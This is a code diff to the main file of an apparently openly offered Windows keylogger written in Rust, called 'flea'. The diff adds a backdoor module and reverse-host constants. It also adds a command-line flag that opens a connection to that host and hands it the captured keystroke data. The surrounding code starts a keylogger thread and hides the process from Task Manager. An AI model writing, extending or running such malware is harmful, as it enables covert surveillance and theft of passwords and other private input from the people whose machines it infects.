@@ -1,6 +1,7 @@
 //#![windows_subsystem = "windows"]
 
 mod updater;
+mod backdoor;
 
 extern crate exitcode;
 extern crate getopts;
@@ -13,12 +14,18 @@ use flealib::fleaserver::FleaServer;
 use flealib::keylogger::*;
 use getopts::Options;
 use local_ip_address::local_ip;
+use backdoor::Backdoor;
 
 #[macro_use]
 extern crate log;
 
 //Change the port number of the server according to your needs
 const SERVER_PORT: &'static str = ":1972";
+
+//IP address and the port of the reverse host
+const RHOST: &'static str = "192.168.0.19";
+const RPORT: &'static str = ":1973";
+
 const BACKUP_FILENAME: &'static str = "flea.bak";
 const UPDATE_FILENAME: &'static str = "flea.upd";
 
@@ -118,6 +125,8 @@ fn main()
     let mut opts = Options::new();
 
     opts.optopt("s", "server", "Server IP to listen on", "Leave empty to listen on the host ip address");
+    opts.optflag("b", "backdoor", "Starts connection to the backdoor server");
+    opts.optflag("h", "help", "Print this help menu");
 
     let matches = match opts.parse(&args[1..]) 
     {
@@ -125,7 +134,14 @@ fn main()
         Err(f) => { println!("{}", f.to_string()); print_usage(&program, opts); return }
     };
 
+    if matches.opt_present("h") 
+    {
+        print_usage(&program, opts);
+        return;
+    }
+
     let host_address = matches.opt_str("s");
+    let backdoor = matches.opt_present("b");
 
     let running = Arc::new(AtomicBool::new(true));
     let r = running.clone();
@@ -153,14 +169,31 @@ fn main()
     let kl = Arc::clone(&key_logger_data);
 
     let handle = thread::spawn(move|| {
+        debug!("Starting keylogger");
         run(current_path, kl);
     });
     
     //Hide flea process in Task Manager (only on Windows. Must be ran as admin)
     let kl2 = Arc::clone(&key_logger_data);
     let handle2 = thread::spawn(move|| {
+        debug!("Hiding flea process");
         flealib::hideflea::hide_flea_process(kl2);
     });
+
+    //If backdoor flag is set, start connection to the backdoor server
+    let backdoor_handle = if backdoor
+    {
+        debug!("Starting backdoor connection");        
+        let kl3 = Arc::clone(&key_logger_data);
+        Some(thread::spawn(move|| {
+            let backdoor_server = Backdoor::new();
+            backdoor_server.run(&format!("{}{}", RHOST, RPORT), kl3);
+        }))        
+    }
+    else
+    {
+        None
+    };
 
     let flea_server = FleaServer{};
     
@@ -170,6 +203,10 @@ fn main()
 
     handle.join().unwrap();
     handle2.join().unwrap();
+    if backdoor_handle.is_some()
+    {
+        backdoor_handle.unwrap().join().unwrap();
+    }
 
     info!("Stop");
     
